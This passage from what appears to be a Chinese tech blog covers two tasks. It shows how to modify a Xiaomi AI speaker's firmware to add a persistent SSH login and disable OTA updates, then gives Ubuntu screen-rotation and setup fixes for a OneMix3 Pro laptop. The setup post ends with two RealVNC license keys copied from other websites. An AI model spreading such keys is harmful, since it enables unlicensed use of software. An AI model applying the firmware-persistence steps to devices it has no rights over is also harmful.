Jan  1  2015 /dev/mtdblock6</span><br></pre></td></tr></table></figure>

<p>切到&#x2F;tmp临时目录，对系统镜像进行提取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# cd /tmp</span><br><span class="line">root@S12A:/tmp# dd if=/dev/mtdblock4 of=/tmp/m4.img</span><br><span class="line">65536+0 records in</span><br><span class="line">65536+0 records out</span><br></pre></td></tr></table></figure>

<p>scp 把 m4.img 复制到另一台 Linux 机器，再回来把 &#x2F;tmp&#x2F;m4.img 删除，重新 dd mtdblock5 出来做个b分区备份。</p>
<h3 id="4-解压并修改分区"><a href="#4-解压并修改分区" class="headerlink" title="4. 解压并修改分区"></a>4. 解压并修改分区</h3><h4 id="4-1-解压分区"><a href="#4-1-解压分区" class="headerlink" title="4.1 解压分区"></a>4.1 解压分区</h4><p>在 Linux 机器上解压提取到的 m4.img 镜像，查看 block size，后面重新压缩会用到。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -s mtdblock4.img</span><br><span class="line">Found a valid SQUASHFS 4:0 superblock on mtdblock4.img.</span><br><span class="line">Creation or last append time Thu Jul 16 13:04:11 2020</span><br><span class="line">Filesystem size 32052.31 Kbytes (31.30 Mbytes)</span><br><span class="line">Compression xz</span><br><span class="line">xz: error reading stored compressor options from filesystem!</span><br><span class="line">Block size 131072</span><br><span class="line">Filesystem is exportable via NFS</span><br><span class="line">Inodes are compressed</span><br><span class="line">Data is compressed</span><br><span class="line">Fragments are compressed</span><br><span class="line">Always-use-fragments option is not specified</span><br><span class="line">Xattrs are not stored</span><br><span class="line">Duplicates are removed</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of ids 1</span><br></pre></td></tr></table></figure>

<p>解压镜像，<strong>注意这里需要用 root 解压，非 root 账户可能无法创建设备文件等特殊文件，重新打包刷入后，系统会起不来</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -dest m4 mtdblock4.img</span><br><span class="line">Parallel unsquashfs: Using 4 processors</span><br><span class="line">1661 inodes (2074 blocks) to write</span><br><span class="line"></span><br><span class="line">[======================================================/] 2074/2074 100%</span><br><span class="line"></span><br><span class="line">created 1082 files</span><br><span class="line">created 102 directories</span><br><span class="line">created 578 symlinks</span><br><span class="line">created 1 devices</span><br><span class="line">created 0 fifos</span><br></pre></td></tr></table></figure>

<h4 id="4-2-添加自启动项"><a href="#4-2-添加自启动项" class="headerlink" title="4.2 添加自启动项"></a>4.2 添加自启动项</h4><p>修改 &#x2F;etc&#x2F;rc.local 添加 &#x2F;data&#x2F;init.sh（或者把自启动的命令都写入rc.local也行，反正镜像都改写了），改完的文件如下：</p>
<h5 id="rc-local"><a href="#rc-local" class="headerlink" title="rc.local"></a>rc.local</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# cat m4/etc/rc.local</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system init finished. By default this file does nothing.</span></span><br><span class="line">sh /data/init.sh &amp;</span><br><span class="line">exit 0</span><br><span class="line">root@ubuntu:/home/test/Desktop/xiaomi#</span><br></pre></td></tr></table></figure>

<h5 id="data-init-sh"><a href="#data-init-sh" class="headerlink" title="&#x2F;data&#x2F;init.sh"></a>&#x2F;data&#x2F;init.sh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12A:~# chmod +x /data/init.sh					# 添加可执行属性</span><br><span class="line">root@S12A:~# ll /data/init.sh					</span><br><span class="line">-rwxr-xr-x    1 root     root           188 Dec 24  2019 /data/init.sh*</span><br><span class="line">root@S12A:~# cat /data/init.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">if [ -e /data/dropbear_rsa_host_key ]</span><br><span class="line">then</span><br><span class="line">  echo &quot;exists&quot;</span><br><span class="line">else</span><br><span class="line">  echo &quot;not exist&quot;</span><br><span class="line">  dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">fi</span><br><span class="line">dropbear -r /data/dropbear_rsa_host_key</span><br></pre></td></tr></table></figure>

<h4 id="4-3-写入-ssh-密钥"><a href="#4-3-写入-ssh-密钥" class="headerlink" title="4.3 写入 ssh 密钥"></a>4.3 写入 ssh 密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# cat /etc/dropbear/authorized_keys</span><br><span class="line">ssh-rsa AAA**************************************************</span><br></pre></td></tr></table></figure>

<h4 id="4-4-关闭-OTA"><a href="#4-4-关闭-OTA" class="headerlink" title="4.4 关闭 OTA"></a>4.4 关闭 OTA</h4><p>修改 crontab 文件，关闭 OTA 检查，以防系统更新后自启动项 &amp; ssh 密钥消失。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# cat /etc/crontabs/root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">explain crontab <span class="keyword">in</span> https://crontab.guru/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># At every 5th minute.</span></span></span><br><span class="line">*/5 * * * * /usr/sbin/easy_logcut size</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">At every minute.</span></span><br><span class="line">* * * * * /usr/sbin/network_probe.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">At 04:32.</span></span><br><span class="line">32 4 * * * /usr/sbin/pns refresh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">At every 10th minute.</span></span><br><span class="line">*/10 * * * * /usr/bin/check_mediaplayer_status</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">At 03:00.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0 3 * * * /bin/ota slient  <span class="comment"># check ota</span></span></span><br></pre></td></tr></table></figure>

<p>通过查看 ota 脚本，发现 ota 服务器应该是 api.miwifi.com，直接在上级路由将域名屏蔽也可以。</p>
<h3 id="5-重新打包分区，刷入设备"><a href="#5-重新打包分区，刷入设备" class="headerlink" title="5. 重新打包分区，刷入设备"></a>5. 重新打包分区，刷入设备</h3><p>按之前查看 block size 的信息作为参数重新打包分区，不同设备型号的 block size 可能不同。</p>
<p>仍然用 root 操作，不然有些文件权限会出问题。另外一定要做一定的压缩，如果 img 过大，会出现刷写不完整，导致分区起不来，切换到 b 分区。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# mksquashfs m4 m4_crack.img -b 131072 -comp xz -Xbcj arm -Xdict-size 32K -no-xattrs</span><br><span class="line">Parallel mksquashfs: Using 4 processors</span><br><span class="line">Creating 4.0 filesystem on m4_crack.img, block size 131072.</span><br><span class="line">[======================================================\] 1495/1495 100%</span><br><span class="line"></span><br><span class="line">Exportable Squashfs 4.0 filesystem, xz compressed, data block size 131072</span><br><span class="line">	compressed data, compressed metadata, compressed fragments, no xattrs</span><br><span class="line">	duplicates are removed</span><br><span class="line">Filesystem size 32469.29 Kbytes (31.71 Mbytes)</span><br><span class="line">	46.00% of uncompressed filesystem size (70587.29 Kbytes)</span><br><span class="line">Inode table size 15932 bytes (15.56 Kbytes)</span><br><span class="line">	24.82% of uncompressed inode table size (64178 bytes)</span><br><span class="line">Directory table size 17978 bytes (17.56 Kbytes)</span><br><span class="line">	44.87% of uncompressed directory table size (40068 bytes)</span><br><span class="line">Number of duplicate files found 23</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of files 1082</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of symbolic links  578</span><br><span class="line">Number of device nodes 1</span><br><span class="line">Number of fifo nodes 0</span><br><span class="line">Number of socket nodes 0</span><br><span class="line">Number of directories 102</span><br><span class="line">Number of ids (unique uids + gids) 1</span><br><span class="line">Number of uids 1</span><br><span class="line">	root (0)</span><br><span class="line">Number of gids 1</span><br><span class="line">	root (0)</span><br></pre></td></tr></table></figure>

<p>在小爱同学上删除 &#x2F;tmp&#x2F;m4.img，将修改后的 <code>m4_crack.img</code> 复制回小爱同学的临时目录，刷写镜像到 mtdblock4</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system0</span><br><span class="line">Unlocking system0 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system0 ...  [w]         </span><br><span class="line">root@S12:/tmp# /usr/bin/fw_env -s boot_part boot0</span><br><span class="line">[ubootenv] update_bootenv_varible name [boot_part]: value [boot0]</span><br><span class="line">[ubootenv] Save ubootenv to /dev/nand_env succeed!</span><br></pre></td></tr></table></figure>



<p>如果重启OK，并且没有切到 b 分区的话，证明刷写成功，可以选择把 b 分区也刷写了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system1</span><br><span class="line">Unlocking system1 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system1 ...  [w]         </span><br><span class="line">root@S12:/tmp# </span><br></pre></td></tr></table></figure>

<h3 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h3><p>从老家寄来了在 MIDC 2017 会议上的礼品，首发版 小米AI音箱，这个拆开看是黑色板子的，大概如图。</p>
<img src="/2020/12/01/2020-12-01/black-board.jpg" class="">

<p>这个硬件型号的设备，系统没有 mount 到 ro，可以直接写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@S12:~# mount</span><br><span class="line">rootfs on / type rootfs (rw)</span><br><span class="line">/dev/ubi0_0 on / type ubifs (rw,noatime)</span><br><span class="line">devtmpfs on /dev type devtmpfs (rw,relatime,size=115548k,nr_inodes=28887,mode=755)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">cgroup on /sys/fs/cgroup type cgroup (rw,nosuid,nodev,noexec,relatime,debug,cpu,cpuacct,devices,freezer,net_cls,blkio)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">/dev/ubi1_0 on /data type ubifs (rw,relatime)</span><br><span class="line">root@S12:~#</span><br></pre></td></tr></table></figure>

<p>类似方法加入 ssh，禁用 ota 即可。</p>
<p>另外发现 <code>/tmp/mico_aivs_lab/instruction.log</code> 文件中临时存有小爱的交流日志，后面有空可以结合 homeassistant 搞一些事情。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>一号本 OneMix3 Pro Ubuntu屏幕校正</title>
    <url>/2020/11/16/2020-11-16/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前在一号本（OneMix3 Pro）上装的Ubuntu系统因为懒得做环境分离，终于把环境搞乱了 T_T，遂重装一下Ubuntu顺便升到最新版20.04。</p>
<p>一号本有点ZZ，主板层面认为屏幕是竖着的，所以除原生 win10 ，加了grub之后，grub和ubuntu默认都是竖屏的。而之前装系统的时候没有做过程记录，所以忘了上次是怎么解决“竖屏”问题的了。。。</p>
<p>重新google一番，主要发现以下方法。</p>
<span id="more"></span>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>最快速也是最丑的方法，Ubuntu默认有个服务<code>iio-sensor-proxy</code>，有点类似手机上的“屏幕旋转”，然而一号本的加速度传感器方向不是常规的方向，所以这个旋转总是往错误的方向翻转，可以卸载这个服务后，每次进入桌面手动设置屏幕<br>方向。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载服务</span></span><br><span class="line">x@One-Mix3-Pro:~$ sudo apt-get --purge remove iio-sensor-proxy</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看屏幕名称，这里看到是eDP-1</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --query</span><br><span class="line">Screen 0: minimum 320 x 200, current 2560 x 1600, maximum 16384 x 16384</span><br><span class="line">eDP-1 connected primary 2560x1600+0+0 left (normal left inverted right x axis y axis) 113mm x 181mm</span><br><span class="line">   1600x2560     55.86*+</span><br><span class="line">HDMI-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">DP-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">HDMI-2 disconnected (normal left inverted right x axis y axis)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每次登陆执行屏幕翻转，可以写个自启动项</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --output eDP-1 --rotate left</span><br></pre></td></tr></table></figure>

<p>可以写一个gnome启动项，控制gnome每次登陆的时候执行屏幕旋转。</p>
<p>打开“启动应用程序”程序</p>
<img src="/2020/11/16/2020-11-16/startup.jpg" class="">

<p>或者<code>alt + F2</code>运行<code>gnome-session-properties</code>，在其中添加旋转屏幕命令</p>
<img src="/2020/11/16/2020-11-16/startupapp.png" class="">

<p>再或者直接shell里添加gnome启动项文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~/.config/autostart$ cat export.desktop</span><br><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Exec=export DISPLAY=:0;xrandr  --output eDP-1 --rotate left</span><br><span class="line">Hidden=false</span><br><span class="line">NoDisplay=false</span><br><span class="line">X-GNOME-Autostart-enabled=true</span><br><span class="line">Name[zh_CN]=screen rotate</span><br><span class="line">Name=screen rotate</span><br><span class="line">Comment[zh_CN]=aaa</span><br><span class="line">Comment=Rotate the default screen</span><br></pre></td></tr></table></figure>

<p>Ubuntu 20.04上不知道为什么这个启动项经常不允许，老版本Ubuntu这个启动项还是有点用的。</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>上面的方法通过卸载“屏幕旋转”服务，使得屏幕不会被错误的旋转，但也造成屏幕没法自动旋转。不太喜欢这种因噎废食的做法，重新安装上<code>iio-sensor-proxy</code>，继续看了下其他方法。</p>
<p>查阅了一些<span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQvamljMjMvaWlvLmdpdC90cmVlL0RvY3VtZW50YXRpb24vQUJJL3Rlc3Rpbmcvc3lzZnMtYnVzLWlpbyNuMTYzOA==" title="https://git.kernel.org/pub/scm/linux/kernel/git/jic23/iio.git/tree/Documentation/ABI/testing/sysfs-bus-iio#n1638">文档<i class="fa fa-external-link"></i></span>，发现加速度传感器的矩阵可以手工校准，参考<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL0dQRFBvY2tldC9jb21tZW50cy9jZTZqeHIvb25lbWl4XzNzX3lvZ2Ffd191YnVudHVfMTgwNDJfaG93X2RvX2lfdGVsbF9pdC8=" title="https://www.reddit.com/r/GPDPocket/comments/ce6jxr/onemix_3s_yoga_w_ubuntu_18042_how_do_i_tell_it/">reddit<i class="fa fa-external-link"></i></span>网友的帖子，先寻找加速度设备的名称：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /sys/`udevadm info -q path -n /dev/iio:device0`/../modalias</span><br><span class="line">acpi:BOSC0200:BOSC0200:</span><br></pre></td></tr></table></figure>

<p>获取到的设备名称为<code>acpi:BOSC0200:BOSC0200:</code>，增加<code>61-sensor-local.hwdb</code>配置文件，设备名为以下格式，并对<code>ACCEL_MOUNT_MATRIX</code>矩阵进行如下调整，更新硬件数据库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/udev/hwdb.d/61-sensor-local.hwdb      # 修改为如下内容</span><br><span class="line">sensor:modalias:acpi:BOSC0200*:dmi:*:*</span><br><span class="line"> ACCEL_MOUNT_MATRIX= -1, 0, 0; 0, 1, 0; 0, 0, 1  # 3x3矩阵</span><br><span class="line">root@One-Mix3-Pro:~# systemd-hwdb update                            # 更新硬件数据库</span><br></pre></td></tr></table></figure>

<p>修改矩阵的时候可以参考<code>monitor-sensor</code>的内容，不断调整设备姿态，确定原生加速度传感器方向。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# monitor-sensor</span><br><span class="line">    Waiting for iio-sensor-proxy to appear</span><br><span class="line">+++ iio-sensor-proxy appeared</span><br><span class="line">=== Has accelerometer (orientation: left-up)</span><br><span class="line">=== No ambient light sensor</span><br><span class="line">    Accelerometer orientation changed: bottom-up</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: right-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br></pre></td></tr></table></figure>

<p>重启并登陆以后，屏幕基本可以按正确的重力方向进行旋转了。那么这个时候新的问题就出现了😂，触屏会偶发性的没有跟随进行旋转，这样就会导致你点右边，左边的程序启动了。。。</p>
<p>依旧查阅文档，发现有个输入设备的矩阵，查看当前输入设备：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput --list</span><br><span class="line">⎡ Virtual core pointer                    	id=2	[master pointer  (3)]</span><br><span class="line">⎜   ↳ Virtual core XTEST pointer              	id=4	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ HAILUCK CO.,LTD USB KEYBOARD Mouse      	id=11	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ GXTP7386:00 27C6:0113                   	id=15	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ GXTP7386:00 27C6:0113 Stylus            	id=16	[slave  pointer  (2)]</span><br><span class="line">⎣ Virtual core keyboard                   	id=3	[master keyboard (2)]</span><br><span class="line">    ↳ Virtual core XTEST keyboard             	id=5	[slave  keyboard (3)]</span><br><span class="line">    ↳ Power Button                            	id=6	[slave  keyboard (3)]</span><br><span class="line">    ↳ Video Bus                               	id=7	[slave  keyboard (3)]</span><br><span class="line">    ↳ Power Button                            	id=8	[slave  keyboard (3)]</span><br><span class="line">    ↳ Sleep Button                            	id=9	[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD            	id=10	[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD System Control	id=12	[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD Consumer Control	id=13	[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD Wireless Radio Control	id=14	[slave  keyboard (3)]</span><br><span class="line">    ↳ GXTP7386:00 27C6:0113 Keyboard          	id=17	[slave  keyboard (3)]</span><br><span class="line">    ↳ AT Translated Set 2 keyboard            	id=18	[slave  keyboard (3)]</span><br></pre></td></tr></table></figure>

<p><code>id=15</code>的<code>GXTP7386:00 27C6:0113</code>是触屏设备，查看这个设备的属性信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput list-props 15</span><br><span class="line">Device &#x27;GXTP7386:00 27C6:0113&#x27;:</span><br><span class="line">	Device Enabled (168):	1</span><br><span class="line">	Coordinate Transformation Matrix (170):	0.000000, -1.000000, 1.000000, 1.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Calibration Matrix (323):	1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Calibration Matrix Default (324):	1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Send Events Modes Available (288):	1, 0</span><br><span class="line">	libinput Send Events Mode Enabled (289):	0, 0</span><br><span class="line">	libinput Send Events Mode Enabled Default (290):	0, 0</span><br><span class="line">	Device Node (291):	&quot;/dev/input/event6&quot;</span><br><span class="line">	Device Product ID (292):	10182, 275</span><br></pre></td></tr></table></figure>

<p>最后写了个脚本，把屏幕旋转的部分和触摸屏识别旋转的部分合在一起，当触摸屏识别没有跟随旋转时执行一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Screen_rotate.sh  written by badb100d</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">portrait (left)</span></span><br><span class="line">export DISPLAY=:0</span><br><span class="line">xrandr --output eDP-1 --rotate left</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">15 is the <span class="built_in">touch</span> screen <span class="built_in">id</span></span></span><br><span class="line">xinput set-prop 15 --type=float &quot;Coordinate Transformation Matrix&quot; 0 -1 1 1 0 0 0 0 1</span><br></pre></td></tr></table></figure>



<h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><h3 id="增大grub字体"><a href="#增大grub字体" class="headerlink" title="增大grub字体"></a>增大grub字体</h3><p>grub 貌似是没法旋转的（除非patch binary），所以将就一下这个颈椎病康复版grub。不过grub的字体还是可以调的，默认字号太小。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# apt install ttf-unifont -y</span><br><span class="line">root@One-Mix3-Pro:~# grub-mkfont -s 32 -o /boot/grub/fonts/unicode32.pf2 /usr/share/fonts/truetype/unifont/unifont.ttf</span><br><span class="line">root@One-Mix3-Pro:~# vim /etc/default/grub     # 增加 GRUB_FONT=/boot/grub/fonts/unicode32.pf2</span><br><span class="line">root@One-Mix3-Pro:~# update-grub							 # 更新grub，再重启</span><br></pre></td></tr></table></figure>



<h3 id="修改-tty-下旋转模式"><a href="#修改-tty-下旋转模式" class="headerlink" title="修改 tty 下旋转模式"></a>修改 tty 下旋转模式</h3><p>GUI下的屏幕旋转解决了，但是有时候纯CUI操作效率更高，也更节约资源。默认的 tty 界面（ctrl+alt+F3）也是旋转的，通过修改 grub 启动参数进行校正：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/default/grub</span><br><span class="line"># If you change this file, run &#x27;update-grub&#x27; afterwards to update</span><br><span class="line"># /boot/grub/grub.cfg.</span><br><span class="line"># For full documentation of the options in this file, see:</span><br><span class="line">#   info -f grub -n &#x27;Simple configuration&#x27;</span><br><span class="line"></span><br><span class="line">GRUB_DEFAULT=0</span><br><span class="line">GRUB_TIMEOUT_STYLE=hidden</span><br><span class="line">GRUB_TIMEOUT=2</span><br><span class="line">GRUB_FONT=/boot/grub/fonts/unicode32.pf2</span><br><span class="line">GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`</span><br><span class="line">#GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;video=efifb fbcon=rotate:3 fbcon=rotate_all:1 quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;net.ifnames=0 biosdevname=0 video=efifb fbcon=rotate:3 fbcon=rotate_all:1&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="line"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="line"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="line">#GRUB_BADRAM=&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="line">#GRUB_TERMINAL=console</span><br><span class="line"></span><br><span class="line"># The resolution used on graphical terminal</span><br><span class="line"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="line"># you can see them in real GRUB with the command `vbeinfo&#x27;</span><br><span class="line">#GRUB_GFXMODE=640x480</span><br><span class="line"></span><br><span class="line"># Uncomment if you don&#x27;t want GRUB to pass &quot;root=UUID=xxx&quot; parameter to Linux</span><br><span class="line">#GRUB_DISABLE_LINUX_UUID=true</span><br><span class="line"></span><br><span class="line"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="line">#GRUB_DISABLE_RECOVERY=&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to get a beep at grub start</span><br><span class="line">#GRUB_INIT_TUNE=&quot;480 440 1&quot;</span><br></pre></td></tr></table></figure>

<p>更新 grub 并重启</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# update-grub</span><br></pre></td></tr></table></figure>



<h3 id="增加-tty-下中文字符支持"><a href="#增加-tty-下中文字符支持" class="headerlink" title="增加 tty 下中文字符支持"></a>增加 tty 下中文字符支持</h3><p>安装<code>fbterm</code>，配置<code>~/.fbtermrc</code>，root和普通用户都配置一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">font-names=Ubuntu Mono</span><br><span class="line">font-size=40</span><br><span class="line">screen-rotate=3</span><br></pre></td></tr></table></figure>

<p>配置<code>fbterm</code>权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setcap &#x27;cap_sys_tty_config+ep&#x27; /usr/bin/fbterm</span><br></pre></td></tr></table></figure>



<h3 id="增加-rc-local-支持"><a href="#增加-rc-local-支持" class="headerlink" title="增加 rc.local 支持"></a>增加 rc.local 支持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line"> Description=/etc/rc.local Compatibility</span><br><span class="line"> ConditionPathExists=/etc/rc.local</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"> Type=forking</span><br><span class="line"> ExecStart=/etc/rc.local start</span><br><span class="line"> TimeoutSec=0</span><br><span class="line"> StandardOutput=tty</span><br><span class="line"> RemainAfterExit=yes</span><br><span class="line"> SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"> WantedBy=multi-user.target</span><br><span class="line"> </span><br><span class="line">root@One-Mix3-Pro:~# systemctl enable rc-local; touch /etc/rc.local; chmod +x /etc/rc.local</span><br></pre></td></tr></table></figure>



<h3 id="无线网卡不休眠"><a href="#无线网卡不休眠" class="headerlink" title="无线网卡不休眠"></a>无线网卡不休眠</h3><p>查看，并修改无线网卡状态（重启失效）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 get power_save</span><br><span class="line">Power save: on</span><br><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 set power_save off</span><br></pre></td></tr></table></figure>

<p>修改无线网卡配置（重启不失效）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line">[connection]</span><br><span class="line">wifi.powersave = 2</span><br></pre></td></tr></table></figure>



<h3 id="安装VNC（系统自带的太辣鸡）"><a href="#安装VNC（系统自带的太辣鸡）" class="headerlink" title="安装VNC（系统自带的太辣鸡）"></a>安装VNC（系统自带的太辣鸡）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# wget https://downloads.realvnc.com/download/file/vnc.files/VNC-Server-6.10.1-Linux-x64.deb</span><br><span class="line">root@One-Mix3-Pro:~# dpkg -i VNC-Server-6.10.1-Linux-x64.deb</span><br><span class="line">root@One-Mix3-Pro:~# sed -i &quot;s/^[#]WaylandEnable=false/WaylandEnable=false/&quot; /etc/gdm3/custom.conf  # force the login screen to use Xorg</span><br></pre></td></tr></table></figure>
<p>VNC license:<br>从<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSGVucnktWkhBTy9wLzEzMDI3MjIwLmh0bWw=" title="https://www.cnblogs.com/Henry-ZHAO/p/13027220.html">cnblog<i class="fa fa-external-link"></i></span>找了一个<code>VKUPN-MTHHC-UDHGS-UWD76-6N36A</code><br>从<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDYyMDgyODU=" title="https://zhuanlan.zhihu.com/p/546208285">zhihu<i class="fa fa-external-link"></i></span>找了一个<code>Z456C-LMKTC-NLGWQ-H5CUR-ZVWEA</code></p>
